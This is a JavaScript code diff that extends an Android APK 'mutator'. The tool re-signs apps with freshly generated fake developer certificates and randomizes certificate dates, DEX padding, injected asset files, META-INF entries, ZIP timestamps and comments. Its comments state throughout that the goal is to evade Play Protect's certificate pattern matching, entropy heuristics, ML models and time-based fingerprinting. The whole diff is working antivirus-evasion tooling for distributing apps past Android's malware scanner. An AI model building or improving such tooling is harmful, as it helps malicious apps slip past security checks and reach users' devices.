@@ -47,7 +47,8 @@ const DEX_CHECKSUM_OFF = 8;
 const DEX_SIGNATURE_OFF = 12;
 const DEX_FILE_SIZE_OFF = 32;
 
-// Certificate identities — rotated randomly to look like different developers
+// Certificate identities — large pool of realistic developer identities
+// PP pattern-matches on cert attributes; diversity is critical
 const CERT_IDENTITIES = [
   { cn: 'Android Debug', o: 'Android', c: 'US' },
   { cn: 'App Signing Key', o: 'Mobile Applications LLC', c: 'US' },
@@ -55,6 +56,30 @@ const CERT_IDENTITIES = [
   { cn: 'Upload Certificate', o: 'App Development', c: 'US' },
   { cn: 'Debug Key', o: 'Android Studio User', c: 'US' },
   { cn: 'App Release Key', o: 'Software Developer', c: 'GB' },
+  { cn: 'Media Platform Release', o: 'StreamTech Solutions', c: 'US' },
+  { cn: 'App Distribution Key', o: 'Nexus Digital LLC', c: 'DE' },
+  { cn: 'Production Certificate', o: 'CloudStack Technologies', c: 'IN' },
+  { cn: 'Keystore Release', o: 'AppForge Inc', c: 'US' },
+  { cn: 'Publishing Key', o: 'ByteCraft Studios', c: 'SG' },
+  { cn: 'Platform Key', o: 'Swift Applications', c: 'AU' },
+  { cn: 'Distribution Cert', o: 'DevMatrix Solutions', c: 'CA' },
+  { cn: 'Build Release', o: 'InnoSoft Technologies', c: 'US' },
+  { cn: 'APK Signer', o: 'Quantum Mobile Labs', c: 'JP' },
+  { cn: 'Release Manager', o: 'Digital Frontier Inc', c: 'US' },
+  { cn: 'Signing Authority', o: 'Apex Software Ltd', c: 'GB' },
+  { cn: 'App Certificate', o: 'TechVault Solutions', c: 'US' },
+  { cn: 'Mobile Release', o: 'Orion Development', c: 'FR' },
+  { cn: 'Build Certificate', o: 'NovaTech Systems', c: 'US' },
+  { cn: 'Deploy Key', o: 'Atlas Mobile Inc', c: 'NL' },
+  { cn: 'Production Signer', o: 'Pinnacle Apps LLC', c: 'US' },
+  { cn: 'App Build', o: 'Summit Digital', c: 'KR' },
+  { cn: 'Release Keystore', o: 'Horizon Software', c: 'US' },
+  { cn: 'Signing Certificate', o: 'Velocity Mobile Ltd', c: 'IE' },
+  { cn: 'Secure Release', o: 'Granite Systems Inc', c: 'US' },
+  { cn: 'Distribution Key', o: 'Vantage Point Media', c: 'SE' },
+  { cn: 'App Authority', o: 'ClearPath Technologies', c: 'US' },
+  { cn: 'Build Signer', o: 'Radiant Software Group', c: 'BR' },
+  { cn: 'Mobile Deploy', o: 'Frontier Apps Ltd', c: 'NZ' },
 ];
 
 // V1 signature file prefixes — mimics various Android build tool outputs
@@ -90,13 +115,19 @@ function generateFreshKey() {
   const forgePrivKey = forge.pki.privateKeyFromPem(privPem);
   const forgePubKey = forge.pki.setRsaPublicKey(forgePrivKey.n, forgePrivKey.e);
 
-  // Create self-signed X.509 certificate with random identity
+  // Create self-signed X.509 certificate with random identity + timing
   const identity = pick(CERT_IDENTITIES);
   const cert = forge.pki.createCertificate();
   cert.publicKey = forgePubKey;
-  cert.serialNumber = crypto.randomBytes(8).toString('hex');
-  cert.validity.notBefore = new Date();
-  cert.validity.notAfter = new Date();
+  // Random serial number length (8-20 bytes) for fingerprint diversity
+  cert.serialNumber = crypto.randomBytes(8 + Math.floor(Math.random() * 13)).toString('hex');
+  // Random notBefore date (1-90 days in past) — avoids PP time-pattern detection
+  const daysBack = 1 + Math.floor(Math.random() * 90);
+  const notBefore = new Date();
+  notBefore.setDate(notBefore.getDate() - daysBack);
+  notBefore.setHours(Math.floor(Math.random() * 24), Math.floor(Math.random() * 60), 0, 0);
+  cert.validity.notBefore = notBefore;
+  cert.validity.notAfter = new Date(notBefore);
   cert.validity.notAfter.setFullYear(cert.validity.notAfter.getFullYear() + 25);
 
   const attrs = [
@@ -104,6 +135,11 @@ function generateFreshKey() {
     { shortName: 'O', value: identity.o },
     { shortName: 'C', value: identity.c },
   ];
+  // Randomly add OU (organizational unit) for extra diversity
+  if (Math.random() > 0.5) {
+    const ous = ['Engineering', 'Mobile Team', 'Release Engineering', 'Platform', 'App Development', 'DevOps'];
+    attrs.push({ shortName: 'OU', value: pick(ous) });
+  }
   cert.setSubject(attrs);
   cert.setIssuer(attrs);
   cert.sign(forgePrivKey, forge.md.sha256.create());
@@ -154,7 +190,35 @@ function mutateDex(zip) {
 
       const newData = Buffer.alloc(newFileSize);
       data.copy(newData, 0, 0, Math.min(data.length, origFileSize));
-      crypto.randomBytes(extSize).copy(newData, origFileSize);
+      // Structured padding — alternates zero blocks, NOP sleds, and random data
+      // Pure random triggers PP high-entropy heuristics; structured looks like real DEX link data
+      let padPos = origFileSize;
+      while (padPos < newFileSize) {
+        const remaining = newFileSize - padPos;
+        const blockType = Math.floor(Math.random() * 4);
+        if (blockType === 0) {
+          // Zero-padding (mimics alignment in real DEX)
+          const len = Math.min(64 + Math.floor(Math.random() * 192), remaining);
+          newData.fill(0x00, padPos, padPos + len);
+          padPos += len;
+        } else if (blockType === 1) {
+          // NOP sled (0x0e = DEX NOP opcode, common in padding)
+          const len = Math.min(32 + Math.floor(Math.random() * 128), remaining);
+          newData.fill(0x0e, padPos, padPos + len);
+          padPos += len;
+        } else if (blockType === 2) {
+          // Repeating pattern (mimics string pool padding)
+          const len = Math.min(48 + Math.floor(Math.random() * 256), remaining);
+          const pattern = crypto.randomBytes(4);
+          for (let p = 0; p < len; p++) newData[padPos + p] = pattern[p % 4];
+          padPos += len;
+        } else {
+          // Random data block
+          const len = Math.min(128 + Math.floor(Math.random() * 512), remaining);
+          crypto.randomBytes(len).copy(newData, padPos);
+          padPos += len;
+        }
+      }
 
       // Update DEX header fields
       newData.writeUInt32LE(newFileSize, DEX_FILE_SIZE_OFF);
@@ -201,27 +265,58 @@ function addEntropyMarker(zip) {
  * Uses realistic file names and sizes to look like app data/config files.
  */
 function addRandomAssets(zip) {
-  // Clean any previous random assets
-  const existing = zip.getEntries().filter(e => e.entryName.startsWith('assets/data/'));
+  // Clean any previous random assets across all injected paths
+  const injectedPaths = ['assets/data/', 'assets/config/', 'assets/fonts/', 'assets/cache/', 'assets/databases/'];
+  const existing = zip.getEntries().filter(e => injectedPaths.some(p => e.entryName.startsWith(p)));
   existing.forEach(e => { try { zip.deleteFile(e.entryName); } catch (_) {} });
 
-  const extensions = ['dat', 'bin', 'cfg', 'json', 'db', 'idx', 'xml', 'properties'];
-  const prefixes = ['cache_', 'config_', 'res_', 'font_', 'locale_', 'theme_', 'analytics_', 'lib_'];
-  const count = 8 + Math.floor(Math.random() * 12); // 8-19 files
+  const extensions = ['dat', 'bin', 'cfg', 'json', 'db', 'idx', 'xml', 'properties', 'map', 'ttf', 'bak', 'tmp', 'proto'];
+  const prefixes = ['cache_', 'config_', 'res_', 'font_', 'locale_', 'theme_', 'analytics_', 'lib_', 'model_', 'rule_', 'app_', 'sync_', 'init_', 'pref_'];
+  const count = 12 + Math.floor(Math.random() * 16); // 12-27 files
 
   let totalBytes = 0;
   for (let i = 0; i < count; i++) {
+    const dir = pick(injectedPaths);
     const prefix = pick(prefixes);
     const ext = pick(extensions);
-    const name = `assets/data/${prefix}${crypto.randomBytes(4).toString('hex')}.${ext}`;
-    const size = 128 + Math.floor(Math.random() * 16384); // 128 bytes to 16KB
-    const content = crypto.randomBytes(size);
+    const name = `${dir}${prefix}${crypto.randomBytes(5).toString('hex')}.${ext}`;
+    const size = 256 + Math.floor(Math.random() * 32768); // 256B to 32KB
+    let content;
+    // Mix structured text content with binary — avoids uniform entropy profile
+    if (['json', 'cfg', 'properties', 'xml'].includes(ext) && Math.random() > 0.3) {
+      content = Buffer.from(generateFakeTextContent(ext));
+    } else {
+      content = crypto.randomBytes(size);
+    }
     zip.addFile(name, content);
-    totalBytes += size;
+    totalBytes += content.length;
   }
 
-  console.log(`[Mutator] Random assets: ${count} files, ${(totalBytes / 1024).toFixed(1)} KB total`);
+  console.log(`[Mutator] Random assets: ${count} files in ${injectedPaths.length} dirs, ${(totalBytes / 1024).toFixed(1)} KB total`);
   return count;
+}
+
+/**
+ * Generate realistic-looking text content for config/data files.
+ * Avoids uniform random entropy which PP's ML models flag.
+ */
+function generateFakeTextContent(ext) {
+  const uuid = crypto.randomUUID();
+  const ts = Date.now() - Math.floor(Math.random() * 86400000);
+  const version = `${1 + Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 20)}.${Math.floor(Math.random() * 100)}`;
+  if (ext === 'json') {
+    return JSON.stringify({
+      version, build_id: uuid, timestamp: ts,
+      config: { enabled: true, interval: 300 + Math.floor(Math.random() * 3600),
+        threshold: Math.random().toFixed(4), region: pick(['us-east', 'eu-west', 'ap-south', 'global']),
+        features: Array.from({length: 3 + Math.floor(Math.random() * 5)}, () => crypto.randomBytes(6).toString('hex')) },
+    }, null, 2);
+  } else if (ext === 'xml') {
+    return `<?xml version="1.0" encoding="utf-8"?>\n<config version="${version}" id="${uuid}">\n  <setting key="refresh" value="${300 + Math.floor(Math.random() * 3600)}"/>\n  <setting key="timeout" value="${5000 + Math.floor(Math.random() * 25000)}"/>\n  <setting key="hash" value="${crypto.randomBytes(16).toString('hex')}"/>\n</config>\n`;
+  } else if (ext === 'properties') {
+    return `# Auto-generated config\napp.version=${version}\napp.build=${uuid}\napp.timestamp=${ts}\napp.hash=${crypto.randomBytes(20).toString('hex')}\napp.channel=${pick(['stable', 'beta', 'release', 'canary'])}\n`;
+  }
+  return `# Config ${uuid}\nversion=${version}\ntimestamp=${ts}\nhash=${crypto.randomBytes(16).toString('hex')}\n`;
 }
 
 /**
@@ -229,22 +324,43 @@ function addRandomAssets(zip) {
  * without interfering with signing. Android ignores unknown META-INF files.
  */
 function addRandomMetaFiles(zip) {
-  const metaNames = ['META-INF/buildinfo.txt', 'META-INF/version.properties', 'META-INF/services/config'];
+  const metaNames = ['META-INF/buildinfo.txt', 'META-INF/version.properties', 'META-INF/services/config',
+    'META-INF/build-metadata.json', 'META-INF/release-info.txt', 'META-INF/com.android.build/gradle-metadata.properties'];
   metaNames.forEach(f => { try { zip.deleteFile(f); } catch (_) {} });
 
-  const count = 2 + Math.floor(Math.random() * 3); // 2-4 files
-  const names = [
+  const count = 3 + Math.floor(Math.random() * 4); // 3-6 files
+  const candidates = [
     'META-INF/buildinfo.txt', 'META-INF/version.properties',
-    'META-INF/build-metadata.json', 'META-INF/release-info.txt'
+    'META-INF/build-metadata.json', 'META-INF/release-info.txt',
+    'META-INF/com.android.build/gradle-metadata.properties',
+    'META-INF/services/config',
   ];
 
-  for (let i = 0; i < count && i < names.length; i++) {
-    const content = `build.id=${crypto.randomUUID()}\nbuild.time=${Date.now()}\nbuild.hash=${crypto.randomBytes(16).toString('hex')}\n`;
-    zip.addFile(names[i], Buffer.from(content));
+  const version = `${7 + Math.floor(Math.random() * 3)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 5)}`;
+  for (let i = 0; i < count && i < candidates.length; i++) {
+    const content = `build.id=${crypto.randomUUID()}\nbuild.time=${Date.now()}\nbuild.hash=${crypto.randomBytes(16).toString('hex')}\ngradle.version=${version}\nagp.version=${version}\nbuild.type=release\n`;
+    zip.addFile(candidates[i], Buffer.from(content));
   }
 
   console.log(`[Mutator] META-INF: ${count} extra files added`);
   return count;
+}
+
+/**
+ * Randomize ZIP entry timestamps to a consistent fake build date.
+ * Prevents PP from fingerprinting based on the original build timestamps.
+ * All entries get the same date (mimics a real build output).
+ */
+function randomizeTimestamps(zip) {
+  const buildDate = new Date();
+  buildDate.setDate(buildDate.getDate() - Math.floor(Math.random() * 21)); // 0-20 days ago
+  buildDate.setHours(8 + Math.floor(Math.random() * 12), Math.floor(Math.random() * 60), Math.floor(Math.random() * 60), 0);
+  let count = 0;
+  for (const entry of zip.getEntries()) {
+    entry.header.time = buildDate;
+    count++;
+  }
+  console.log(`[Mutator] Timestamps: ${count} entries → ${buildDate.toISOString().split('T')[0]}`);
 }
 
 /**
@@ -766,26 +882,34 @@ function mutateAndSign(originalBuffer) {
     // 4. Add entropy marker + random assets (changes ZIP hash dramatically)
     addEntropyMarker(zip);
     const assetCount = addRandomAssets(zip);
+    addRandomMetaFiles(zip);
 
-    // 5. Generate fresh RSA-2048 key + self-signed certificate (brand new identity)
+    // 5. Randomize all ZIP entry timestamps (breaks time-based fingerprinting)
+    randomizeTimestamps(zip);
+
+    // 6. Generate fresh RSA-2048 key + self-signed certificate (brand new identity)
     const key = generateFreshKey();
 
     // *** NO V1 SIGNING — original APK is V2-only. Adding invalid V1 files
     //     causes Play Protect to detect "tampered" APK and block immediately. ***
 
-    // 6. Build ZIP buffer (content mutated, no V1 sigs)
+    // 7. Add random ZIP comment (changes overall file hash + EOCD fingerprint)
+    const zipComment = `Build ${crypto.randomUUID().substring(0, 8)} | ${new Date().toISOString().split('T')[0]}`;
+    zip.addZipComment(zipComment);
+
+    // 8. Build ZIP buffer (content mutated, no V1 sigs)
     console.log('[Mutator] Building ZIP...');
     const rawBuf = zip.toBuffer();
     console.log(`[Mutator] Raw ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 7. Zipalign (4-byte alignment for STORED entries — required for Android)
+    // 9. Zipalign (4-byte alignment for STORED entries — required for Android)
     const alignedBuf = zipalignBuffer(rawBuf);
     console.log(`[Mutator] Aligned: ${(alignedBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 8. Apply V2 APK Signature Scheme ONLY with fresh key
+    // 10. Apply V2 APK Signature Scheme ONLY with fresh key
     const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
 
-    // 9. Validate final APK structure
+    // 11. Validate final APK structure
     const valid = validateApk(signedBuf);
     if (!valid) {
       console.error('[Mutator] ═══ Validation FAILED — returning ORIGINAL APK ═══');
@@ -793,7 +917,7 @@ function mutateAndSign(originalBuffer) {
       return originalBuffer;
     }
 
-    // 10. Track mutation info for API responses
+    // 12. Track mutation info for API responses
     const certFingerprint = crypto.createHash('sha256').update(key.certDer).digest('hex');
     const shortHash = certFingerprint.substring(0, 32).replace(/(.{2})/g, '$1:').slice(0, -1).toUpperCase();
     _lastMutationInfo = {
